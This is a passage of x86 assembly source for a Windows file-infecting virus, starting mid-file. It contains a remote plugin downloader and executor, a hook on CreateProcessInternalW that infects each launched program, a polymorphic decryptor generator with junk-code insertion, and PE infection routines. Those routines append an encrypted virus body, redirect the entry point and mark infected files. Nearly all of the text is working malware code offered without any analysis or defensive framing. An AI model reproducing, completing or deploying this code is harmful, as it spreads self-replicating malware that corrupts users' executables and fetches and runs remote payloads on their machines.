			add		esi, dword ptr[ebp].pFileNameLen	; now points to z fsize field
			mov		edx, [esi]		; fsize
			
			call	@WritePlugFile
			
			
			; Add plug info 2z struc
			add		esi, 9
			mov		ecx, esi
			sub		ecx, edi	; in ecx - sizeof(pNetStruc) .Not.All. URL{fname, fsize, fver, ftype} + 1
			
			push	dword ptr[ebp].pFileStructsSize
			push	ecx
			
			
			add		dword ptr[ebp].pFileStructsSize, ecx
			inc		dword ptr[ebp].pFileStructsNum
			
			mov		eax, dword ptr[ebp].pFileStruct
			
			.if		!eax
				
				push	ecx
				add		dword ptr[esp], 4
				push	LMEM_ZEROINIT or LMEM_FIXED
				call	dword ptr[ebp].LocalAlloc
				add		eax, 4
				
			.else
				
				
				push	LMEM_ZEROINIT or LMEM_MOVEABLE
				push	dword ptr[ebp].pFileStructsSize
				add		dword ptr[esp], 4
				push	dword ptr[ebp].pFileStruct
				sub		dword ptr[esp], 4
				call	dword ptr[ebp].LocalReAlloc
				add		eax, 4
				
			.endif
			
			mov		dword ptr[ebp].pFileStruct, eax
			
			
			pop		ecx			; addition size
			pop		edx			; all sizeof(struc) old pFileStructsSize
			
			
			; for Future
			push	esi	; pNext
			push	edi ; fname for @ExecutePlugin
			mov		esi, edi
			
			
			mov		edi, eax	; eax = filestruct begin pointer
			add		edi, edx	; sets edi 2 z endof filestruct for append
			rep		movsb
			
			call	@RenewPlugFile
			
			
			; Execute Plugin
			mov		al, byte ptr[edi-1] ; type
			call	@ExecutePlugin		; fname already in stack
			mov		[ebx], eax
			
			pop		esi
			
			; Free buffer allocated by @Download proc
			push	dword ptr[ebp].pPlugBuff
			call	dword ptr[ebp].LocalFree
			
		.else
			
			; Next
			add		esi, dword ptr[ebp].pFileNameLen
			add		esi, 4 + 4 + 1	; add to esi in stack
			
		.endif
		
		pop		ecx
		
	dec	ecx
	jnz @RefreshPlLoop
	
	@RefreshPlEndLoop:

retn

; -----------------------------------------------------------------

@Download:	; Donwload a file
			; IN: eax - szURL, PNetHandle - INTERNET_HANDLE
			; OUT: eax - 1_Done 0_Err, FileBuff - buff (with 1024b overhead)
			; Uses: almost all ;)

	push	0
	push	INTERNET_FLAG_PRAGMA_NOCACHE or INTERNET_FLAG_NO_CACHE_WRITE or INTERNET_FLAG_RELOAD
	push	0
	push	0
	push	eax
	push	dword ptr[ebp].PNetHandle
	call	dword ptr[ebp].InternetOpenUrlA
	
	.If eax == 0	; Err, usualy mean not connected
		
		retn
		
	.endif
	
	mov		dword ptr[ebp].PNetHandle2, eax
	
	xor		ebx, ebx	; pBuff
	mov		ecx, 1024	; size counter
	
	@Loading:
	
	push	ecx
	
	.IF ebx == 0
		
		push	ecx
		push	LMEM_ZEROINIT or LMEM_FIXED
		call	dword ptr[ebp].LocalAlloc
		
		
	.Else
		
		push	LMEM_ZEROINIT or LMEM_MOVEABLE
		push	ecx
		push	dword ptr[ebp].pPlugBuff
		call	dword ptr[ebp].LocalReAlloc
		
	.endif
	
	mov		ebx, eax
	mov		dword ptr[ebp].pPlugBuff, ebx
	
	; correct pBuff
	add		ebx, [esp]
	sub		ebx, 1024


	push	'buff'
	mov		eax, esp

	push	eax
	push	1024
	push	ebx
	push	dword ptr[ebp].PNetHandle2
	call	dword ptr[ebp].InternetReadFile
	
	.if eax == 0		; Connection Interrupted
		
		add	esp, 8
		
		push	dword ptr[ebp].pPlugBuff
		call	dword ptr[ebp].LocalFree
		
		xor		eax, eax
		retn
		
	.endif
	
	pop		eax
	pop		ecx
	
	add		ecx, eax
	
	cmp		eax, 0
	jnz		@Loading	; Download until eax == 0
	
	
	push	dword ptr[ebp].PNetHandle2
	call	dword ptr[ebp].InternetCloseHandle
	
	
	; Return
	
	xor		eax, eax
	inc		eax

retn

; -----------------------------------------------------------------

@UnloadPlugin:	; IN: al - type, [ebx] - handle
				; OUT: eax - success. 0 - fail
	
	.If al == 0
		
		push	dword ptr[ebx]
		call	dword ptr[ebp].FreeLibrary
		
	.Else
		
		push	0
		push	dword ptr[ebx]
		call	dword ptr[ebp].TerminateProcess
		
	.endif
	
	; For context switch
	push	200
	call	dword ptr[ebp].Sleep
	
retn

; -----------------------------------------------------------------

@WritePlugFile:	; IN: eax - fname, edx - fsize, pPlugBuff - buffer
	
	pushad
	
	push	edx
	
	; CreateFileA
	
	push	0
	push	0
	push	CREATE_ALWAYS
	push	0
	push	0
	push	GENERIC_READ  or GENERIC_WRITE
	push	eax
	call 	dword ptr[ebp].CreateFileA		; Try to open or create file
	mov		ebx, eax
	
	pop		edx
	
	push	'buff'
	mov		eax, esp
	
	push	0
	push	eax
	push	edx
	push	dword ptr[ebp].pPlugBuff
	push	ebx
	call 	dword ptr[ebp].WriteFile
	
	pop		eax
	
	push	ebx
	call	dword ptr[ebp].CloseHandle
	
	popad
	
retn

; -----------------------------------------------------------------


@RenewPlugFile:
	
	push	FILE_BEGIN
	push	0
	push	0
	push	dword ptr[ebp].pPlugHandle
	call 	dword ptr[ebp].SetFilePointer
	
	push	'buff'
	mov		eax, esp	
	
	push	0
	push	eax
	
	; size = size_struc + sizeof(size_num)
	mov		eax, dword ptr[ebp].pFileStructsSize
	add		eax, 4 ; struc_num
	push	eax
	
	; Shift pointer 2z left by 4 bytes
	; Renew struc_num value
	mov		eax, dword ptr[ebp].pFileStruct
	sub		eax, 4 ; struc_num
	mov		edx, dword ptr[ebp].pFileStructsNum
	mov		[eax], edx
	push	eax
	
	push	dword ptr[ebp].pPlugHandle
	call 	dword ptr[ebp].WriteFile
	
	pop		eax		; written
	
retn

; -----------------------------------------------------------------

@Splaced:

	push 	ebp			; ebp contains important value
	push	edx			; edx contains work dir address
	
; Prepare
	call	$+5
	@@:
	pop		eax
	sub		eax, @b
	
	lea		ebp, [eax + @StackStruct]
	mov		[ebp].XDelta, eax

	
; Ready To Work
	
	mov		eax, [esp + 20]
	
	mov 	dword ptr[ebp].pszfname, eax	; UNICODE(!)

	
	call	@FileInfect	 ; INFECT IT!!
	
	
	mov		edi, dword ptr[ebp].CreateProcessIntW
	lea 	esi, dword ptr[ebp].prevcodes
	mov 	ecx, 10
	
	rep		movsb		; Restore Bytes
	
	xchg	ebx, ebp	; Stack pointer now in ebx
	assume  ebx: ptr TStackMem
	
	
	pop 	edx
	pop 	ebp
	
	pop		edi			;	Save return point to edi
	call 	dword ptr[ebx].CreateProcessIntW		; Calls original function
	push 	edi
	
	mov		edi, dword ptr[ebx].CreateProcessIntW
	mov		esi, dword ptr[ebx].XDelta
	lea 	esi, dword ptr[esi + opcodes]
	mov 	ecx, 10
	
	rep		movsb		; Write New Bytes
	
	assume  ebx: nothing

ret

; -----------------------------------------------------------------

@Polymorphic:

; Polymorphic pseudocode:
;	
;	call 	$+5
;	pop		<A>
;
;	add		<A>, 5 + VirSize		; Points to vir code
;	push	<A>
;
;	mov		<B>, (VirSize^4)/4
;
;	@DecrypterOffset:
;
;	<crypt> <[A]>[, Key]
;	add 	<A>, 4
;
;	dec		<B>
;
;	loopmod	@DecrypterOffset;
;
;	retn


;	Legend:
;
;		<reg16/32> 	- Random register
;		LoaderSize 	- Polymorph loader size
;		VirSize 	- Size of virus body aligned with 4 bytes
;		Key 		- Crypting Key (can be several - sets in engine)

; 	Almost all instructions can be replaced with their equivalents, chosen randomly.
;	Used max 2 registers - another for trash
	
	pushad
	
	call 	@Randomize
	
	; Set buffers
	
	push	2500h
	push 	LMEM_FIXED OR LMEM_ZEROINIT
	call 	dword ptr[ebp].LocalAlloc
	mov		dword ptr[ebp].pCode, eax
	xchg	eax, edi
	
	push	1000h
	push 	LMEM_FIXED OR LMEM_ZEROINIT
	call 	dword ptr[ebp].LocalAlloc
	mov		dword ptr[ebp].pCrypter, eax
	xchg	eax, esi
	
	
	; Code Generation
	FLUSHTRASH
	
	xor		eax, eax
	mov		word ptr[ebp].Registers, ax
	mov		dword ptr[ebp].dwCodeSize, edi
	
	
	; >FIRST CODE PART
	
	xor		ebx, ebx
	inc 	ebx
	call	@GetRegister			; <A>
	xchg	al, dl
	
	;--------------------------------------------
	
	mov		byte ptr[ebp].bA, dl	; Save(<A>)
	
	;--------------------------------------------
	
	xor		eax, eax
	xor		ebx, ebx
	call	@GenCall				; call $+5
	FLUSHTRASH
	
	;--------------------------------------------
	
	mov		ebx, edi
	sub		ebx, dword ptr[ebp].dwCodeSize ; for VirBegin offset
	call	@GenRegPop				; pop <A>
	FLUSHTRASH
	
	;--------------------------------------------
	
	; Allign VirBodySize with 4
	
	mov		eax, VirBodySize + 3
	shr		eax, 2
	shl		eax, 2	; shift back 
	
	mov		dword ptr[ebp].dwVirSizeAlligned, eax
	;--------------------------------------------
	
	mov		ebx, eax
	add		ebx, 5 		; call
	neg		ebx
	call	@GenImmAdd				; add <A>, -(5 + VirSize)
	FLUSHTRASH
	
	;--------------------------------------------
	
	call	@GenRegPush				; push <A>
	FLUSHTRASH
	
	; ~FIRST CODE PART


	
	; >LOOPMOD
	
	xor		ebx, ebx
	inc 	ebx
	call	@GetRegister	; <B>
	xchg	al, dl
	
	;--------------------------------------------

	mov		ebx, dword ptr[ebp].dwVirSizeAlligned
	
	shr		ebx, 2	; divide by 4
	
	;--------------------------------------------
	
	call	@GenImmMov		; mov	<B>, (VirSize^4)/4
	FLUSHTRASH
	
	;--------------------------------------------
	
	push	edi				; LOOP offset
	push	edx				; save <B>
	
	;--------------------------------------------
	
	mov		dl, byte ptr[ebp].bA
	

	mov		dh, 2
	call	@GenCrypt		; <crypt> <[A]>
	FLUSHTRASH
	
	;--------------------------------------------
	
	mov		ebx, 4
	call	@GenImmAdd		; add	<A>, 4	
	FLUSHTRASH
	
	;--------------------------------------------
	
	pop		edx
	call	@GenDec 		; dec <B>
	FLUSHTRASH
	
	;--------------------------------------------
	
	call	@GenCmp0
	
	;--------------------------------------------
	
	pop		eax
	push	edx
	
	mov		ebx, edi
	sub		ebx, eax		; jump distance
	
	mov		dl, 1			; jnz	@DecrypterOffset
	mov		dh, 1			; backjump

	call	@GenJZNZ
	FLUSHTRASH
	
	pop 	edx
	
	;--------------------------------------------
	
	movzx	dx, dh			
	btr		word ptr[ebp].Registers, dx	; Release(<B>)
	movzx	dx, byte ptr[ebp].bA
	btr		word ptr[ebp].Registers, dx	; Release(<A>)
	
	; ~LOOPMOD
	

	
	;--------------------------------------------

	;FLUSHTRASH
	;TRASH
	
	; Return to the vir
	call	@GenVarialRetn
	
	FLUSHTRASH
	TRASH
	
	;--------------------------------------------	
	
	sub		dword ptr[ebp].dwCodeSize, edi
	neg		dword ptr[ebp].dwCodeSize

	popad
ret

; -----------------------------------------------------------------

@ExtractPathW:
	
	add		dword ptr[ebp].pszfname, 2	; Skip First quote symbol
	
	mov		edi, dword ptr[ebp].pszfname
	mov		eax, '"'
	
	xor		ecx, ecx
@FindQuote:
	inc 	ecx
	scasb								; Find 2nd quote symbol
	jne		@FindQuote
	
	dec		ecx
	dec		ecx
	xchg	ebx, ecx
	
	push 	ebx
	push 	0
	call 	dword ptr[ebp].LocalAlloc	; Create New buff for strings
	
	mov		edi, eax
	mov		esi, dword ptr[ebp].pszfname
	xchg	ecx, ebx
	rep		movsb
	
	mov		dword ptr[ebp].pszfname, eax
	xor		eax, eax
	stosw
ret

; -----------------------------------------------------------------
; File Infection
; -----------------------------------------------------------------

assume	ebx: ptr IMAGE_NT_HEADERS
assume 	eax: ptr IMAGE_SECTION_HEADER

@FileInfect:
	
	call	@ExtractPathW
	
	;push 	0
	;push 	dword ptr[ebp].pszfname
	;push	dword ptr[ebp].pszfname
	;push 	0
	;call 	dword ptr[ebp].MessageBoxW
	
	;ret
	
@FileInfectInt:
	
	; CreateFileA/W(pszfname)
	push	0
	push	0
	push	OPEN_EXISTING
	push	0
	push	0
	push	GENERIC_READ or GENERIC_WRITE
	push	dword ptr[ebp].pszfname
	
	.if		byte ptr[ebp].flag == 0
		
		call 	dword ptr[ebp].CreateFileW		; OpenW Target
		
	.else
		
		call 	dword ptr[ebp].CreateFileA		; OpenA Target
		
	.endif
	
		cmp		eax, INVALID_HANDLE_VALUE
		je		@FailedInfect
	
	mov		dword ptr[ebp].pHandle, eax
	; -----------------------------------------------------
	
	
	; 	dwFileSize = GetFileSize(pHandle, NULL);
	push	0
	push	eax
	call	dword ptr[ebp].GetFileSize		; SizeOf(TargetFile)
	
		cmp		eax, -1
		je		@FailedInfect
	
	mov		dword ptr[ebp].dwFileSize, eax
	
	
	;	Dont infect too big exe files ( >5Mb )
		cmp		eax, 500000h
		ja		@FailedInfect

	
	; -----------------------------------------------------
	
	
	; pMemFile = LocalAlloc(LPTR, dwFileSize);
	push	eax
	push 	LMEM_FIXED OR LMEM_ZEROINIT
	call 	dword ptr[ebp].LocalAlloc		; Buffer for File
	
		test	eax, eax
		jz		@FailedInfect
	
	mov		dword ptr[ebp].pMemFile, eax
	xchg	eax, ebx						; ebx contains MemFile handle
	; -----------------------------------------------------
	
	
	; ReadFile(...)
	push	0	; buffer
	push	0
	push	esp
	push	dword ptr[ebp].dwFileSize
	push	dword ptr[ebp].pMemFile
	push	dword ptr[ebp].pHandle
	call	dword ptr[ebp].ReadFile			; Read all file to the mem
	pop		ecx
	
		test	eax, eax
		jz		@FailedInfect
	; -----------------------------------------------------
	
	
	;	Check valid
	call	@InstSEH
	call	@IsValidPE
	call	@UNInstSEH
	
		test	eax, eax
		jnz		@FailedInfect
	; -----------------------------------------------------
	
	
	; Check infected
	call	@AlreadyInfected				; Also sets pMainSect to Section pointed EP
	
		test	eax, eax
		jnz		@FailedInfect
	; -----------------------------------------------------
	
	
	; GenCode
	call	@Polymorphic					; Generates Polymorphic Decryptor, crypt VirCode
	
	
	;	-------------------------------------------------------
	;	Creating Result Code buffer, Crypted VirBody, Decrypter
	;	-------------------------------------------------------
	
	
	;	Calculate full size (dwResCodeSize = VirBodySize + dwCodeSize + sizeof(int))
	;	dwCodeSize is not Alligned
	mov		eax, dword ptr[ebp].dwVirSizeAlligned
	add		eax, dword ptr[ebp].dwCodeSize
	add		eax, 4	; SIGNATURE
	mov		dword ptr[ebp].dwResCodeSize, eax
	; -----------------------------------------------------
	
	
	;	Check Overlay
	call	@OverlayWorks
	
	;	Dont infect files with big non-zero overlay (usualy setup files)
	cmp		dword ptr[ebp].dwOverlaySize, 8000h	; > 32kb
	ja		@FailedInfect
	; -----------------------------------------------------


	; 	Resize MAINSECT && set EP to Decrypter loop, set dwCodeSizeAlligned
	call	@ExpSection	
	
	
	;	dwFileSize += dwResCodeSize
	mov		eax, dword ptr[ebp].dwFileSize
	add		eax, dword ptr[ebp].dwCodeSizeAlligned
	mov		dword ptr[ebp].dwFileSize, eax
	; -----------------------------------------------------
	

	;	+= Buff for code
	;   LocalReAlloc(pMemFile , dwFileSize, LPTR)
	push 	LMEM_MOVEABLE or LMEM_ZEROINIT
	push	eax
	push	dword ptr[ebp].pMemFile
	call 	dword ptr[ebp].LocalReAlloc
	
		test	eax, eax
		jz		@FailedInfect
	
	mov		dword ptr[ebp].pMemFile, eax
	
	; -----------------------------------------------------
	
	; 	Renew pointers
	sub		dword ptr[ebp].pMainSect, ebx
	
	
	mov		ebx, eax
	mov		ebx, dword ptr[ebx + 3ch]	; Refresh PE pointer
	add		ebx, eax
	
	add		dword ptr[ebp].pMainSect, ebx
	; -----------------------------------------------------
	

	; ------------------------------------------------------------------------------------------------------------------------
	;	Shift old data. [OLD SECTION DATA][CR VIRBODY]^^EP^^[POLY DECRYPTER][FREE SPACE AFTER ALLIGN][SIGNATURE][NEXT SECTION]
	; ------------------------------------------------------------------------------------------------------------------------
	
	
	;	Shift nonzero overlay
	
	mov		edi, dword ptr[ebp].pMemFile
	add		edi, dword ptr[ebp].dwFileSize
	
	mov		esi, edi
	
	sub		esi, dword ptr[ebp].dwCodeSizeAlligned
	
	.If dword ptr [ebp].dwOverlaySize != 0
		
		mov		ecx, dword ptr[ebp].dwOverlaySize
		std
		rep		movsb
		
	.EndIf
	
	cld
	; -----------------------------------------------------
	
	
	; Save OEP to virbody
	mov		eax, dword ptr[ebp].XDelta
	add		eax, offset dwReturn
	mov		ecx, dword ptr[ebp].dwOEP
	add		ecx, dword ptr[ebx].OptionalHeader.ImageBase
	mov		dword ptr[eax], ecx
	; -----------------------------------------------------
	
	
	; 	Copy VirBody 2z file buff
	mov		edi, dword ptr[ebp].pMemFile
	add		edi, dword ptr[ebp].dwFileSize
	sub		edi, dword ptr[ebp].dwOverlaySize
	sub		edi, dword ptr[ebp].dwCodeSizeAlligned
	
	push	edi
	mov		esi, dword ptr[ebp].XDelta
	add		esi, @VirBody
	mov		ecx, dword ptr[ebp].dwVirSizeAlligned
	rep		movsb 		; VirBody
	; -----------------------------------------------------
	
	
	; 	Crypt it!
	pop		edi
	mov		ecx, dword ptr[ebp].dwVirSizeAlligned
	shr		ecx, 2
	
	.Repeat
		
		pushad	; Save all registers
		movzx	eax, byte ptr[ebp].bA 	; DestRegister
		inc		eax						; because min value is 1
		neg		eax						; inverse 4 addressation	
		
		push	dword ptr[ebp].pCrypter	; Crypt Proc (for call)
		
		pushad	
		mov		[esp+32+eax*4], edi		; Set Crypting Reg
		popad
		; -------------------------------------------------------
		
		call	dword ptr[esp]			; Crypt. We dont no what reg used.
		add		esp, 4					; in stack Crypt proc addr
		popad							; Restore all registers, except ebx
		
		add		edi, 4
		
	.Untilcxz
	; -----------------------------------------------------
	
	
	;	Write Polymorphic decrypter code
	mov		esi, dword ptr[ebp].pCode
	mov		ecx, dword ptr[ebp].dwCodeSize
	rep		movsb ; Decrypter
	; -----------------------------------------------------
	
	
	;	Write SIGNATURE to z end of section
	mov		eax, dword ptr[ebp].pMainSect
	mov		edi, dword ptr[eax].PointerToRawData
	add		edi, dword ptr[eax].SizeOfRawData
	sub		edi, 4
	add		edi, dword ptr[ebp].pMemFile
	
	mov		eax, dword ptr[ebp].dwFileSize
	stosd	
	; -----------------------------------------------------
	
	
	; -----------------------------------------------------
	;	Writing new virbytes to file
	; -----------------------------------------------------
	
	
	push	FILE_BEGIN
	push	0
	push	0
	push	dword ptr[ebp].pHandle
	call	dword ptr[ebp].SetFilePointer	; SetPointer To Begin

	
	;	WRITE NEW INFECTED FILE
	push	0
	push	0
	push	esp
	push	dword ptr[ebp].dwFileSize
	push	dword ptr[ebp].pMemFile
	push	dword ptr[ebp].pHandle
	call	dword ptr[ebp].WriteFile		; Write New bytes

	pop		eax
	
@FailedInfect:
	
	xor		edi, edi
	
	push	dword ptr[ebp].pHandle
	call	dword ptr[ebp].CloseHandle
	
	push 	dword ptr[ebp].pMemFile
	call 	dword ptr[ebp].LocalFree
	mov		dword ptr[ebp].pMemFile, edi
	
	push 	dword ptr[ebp].pCode
	call 	dword ptr[ebp].LocalFree
	mov		dword ptr[ebp].pCode, edi
	
	push 	dword ptr[ebp].pCrypter
	call 	dword ptr[ebp].LocalFree
	mov		dword ptr[ebp].pCrypter, edi
	
	push 	dword ptr[ebp].pResultCode
	call 	dword ptr[ebp].LocalFree
	mov		dword ptr[ebp].pResultCode, edi
	
ret

; -----------------------------------------------------------------

@IsValidPE:		; 0 - valid, Other - invalid
	
	; Check MZ signature
	cmp     word ptr[ebx], IMAGE_DOS_SIGNATURE
	jnz     @NotValidPE
	
	mov		eax, ebx
	mov		ebx, dword ptr[ebx+3ch]
	add		ebx, eax
	
	; Check PE signature
	cmp     word ptr[ebx], IMAGE_NT_SIGNATURE
	jnz     @NotValidPE
	
	; 32bit Executable file
	cmp		word ptr[ebx].OptionalHeader.Magic, IMAGE_NT_OPTIONAL_HDR32_MAGIC
	jnz		@NotValidPE
	
	xor		eax, eax
	ret
	
@NotValidPE:		; jmp here also from SEH
	
	xor		eax, eax
	dec 	eax

ret

; -----------------------------------------------------------------

@AlreadyInfected:		; IN: ebx - pe, OUT: pMainSect

	movzx	ecx, word ptr[ebx].FileHeader.NumberOfSections
	lea     eax, dword ptr[ebx + sizeof (IMAGE_NT_HEADERS)] ; 1st section
	xor 	edx, edx
	
	.Repeat		; Find Our section, check it for infected
		
		mov		esi, dword ptr [eax].PointerToRawData
		
		.IF		(esi > edx)
			
			mov		dword ptr[ebp].pMainSect, eax	; pMainSect = pMAINSECT
			
		.EndIf
		
		
		add		eax, 28h	; Next Section	
		
	.Untilcxz
	
	
	mov		eax, dword ptr[ebp].pMainSect
	
	; Check infected
	mov		edx, dword ptr[ebp].dwFileSize	; file size
	
	mov		edi, dword ptr [eax].PointerToRawData
	add		edi, dword ptr [eax].SizeOfRawData
	add		edi, dword ptr [ebp].pMemFile
	sub		edi, 4
	
	xor		eax, eax
	
	cmp		edx, dword ptr[edi]	; key must be in end of last section
		jne		@NotInfected
		
		dec 	eax		; If infected, proc returns -1
		
		@NotInfected:
	
ret

; -----------------------------------------------------------------

@ExpSection:		; IN: ebx - pe, OUT: dwOEP, dwCodeSizeAlligned NEW EP: [Prog code][VirCode]<^EP^>[Decrypter]
	
	pushad

	mov		eax, dword ptr[ebp].pMainSect		; Now eax points to MainSection
	
	
	;	-------------------
	;	Resize Last Section
	;	-------------------
	
	;	Characteristics
	mov		dword ptr[eax].Characteristics, 0E0000020h
	
	
	;	SAVE EP
	mov		edx, dword ptr[ebx].OptionalHeader.AddressOfEntryPoint
	mov		dword ptr[ebp].dwOEP, edx
	
	
	; 	EP = VALastSectEnd + VirSize
	mov		edx, dword ptr[eax].VirtualAddress
	add		edx, dword ptr[eax].SizeOfRawData
	add		edx, dword ptr[ebp].dwVirSizeAlligned
	mov		dword ptr[ebx].OptionalHeader.AddressOfEntryPoint, edx
	mov		dword ptr[ebx].OptionalHeader.BaseOfCode, edx
	
	
	;	RAW Size
	;	Size += FileAllign(dwResCodeSize)
	mov 	esi, dword ptr[ebp].dwResCodeSize
	mov 	edi, dword ptr[ebx].OptionalHeader.FileAlignment
	dec		edi
	add		esi, edi
	not		edi
	and		esi, edi
	add		dword ptr[eax].SizeOfRawData, esi
	mov		dword ptr[ebp].dwCodeSizeAlligned, esi
	
	
	; 	VA Size/VA Address
	;	Size += dwCodeSizeAlligned
	mov		esi, dword ptr[eax].SizeOfRawData
	mov		dword ptr[eax].Misc.VirtualSize, esi
	
	
	; 	SizeOfImage
	mov		esi, dword ptr[eax].VirtualAddress
	add		esi, dword ptr[eax].Misc.VirtualSize
	mov		dword ptr[ebx].OptionalHeader.SizeOfImage, esi		
	
	
	popad
	
ret

; -----------------------------------------------------------------

@OverlayWorks:

	xor		eax, eax
	mov		dword ptr [ebp].dwOverlaySize, eax

	mov		eax, dword ptr[ebp].pMainSect
	mov		ecx, dword ptr[eax].PointerToRawData
	add		ecx, dword ptr[eax].SizeOfRawData
	mov		edx, dword ptr[ebp].dwFileSize

	.if ecx < edx	; Overlay Present
		
		sub		edx, ecx
		
		; Check zero overlay
		xor		eax, eax
		mov		edi, ecx
		mov		ecx, edx
		add		edi, dword ptr[ebp].pMemFile
		repe	scasb
		je		OvEmpty
		
		mov		dword ptr [ebp].dwOverlaySize, edx
		
		OvEmpty:
		
	.endif 
	
	assume 	eax: nothing
	assume 	ebx: nothing
ret

; -----------------------------------------------------------------

@InstSEH:
	
	pop		edx
	
	mov		eax, dword ptr[ebp].XDelta
	add		eax, @ExceptHandler
    push    eax
        
    push    dword ptr fs:[0]
    mov     dword ptr fs:[0],esp
    
    push	edx

ret

; -----------------------------------------------------------------

@ExceptHandler:
	
    mov     esp,[esp+8]          
    pop     dword ptr fs:[0000h]
	
	jmp		@NotValidPE
ret

; -----------------------------------------------------------------

@UNInstSEH:
	
	pop		edx
	pop		fs:[0]
	add		esp, 4 
	push 	edx
	
ret

; -----------------------------------------------------------------

@ReturnToOEP:
	
	
	.if dword ptr[ebp].XDelta != 0
		
		mov		eax, dword ptr[ebp].XDelta
		add		eax, offset dwReturn
		mov		eax, [eax]
		
		mov		esp, dword ptr[ebp].PrevStack
		
		jmp		eax
	.Endif
	
	mov		esp, dword ptr[ebp].PrevStack
	
ret

; -----------------------------------------------------------------

@StackStruct:

@endvir:
end start    
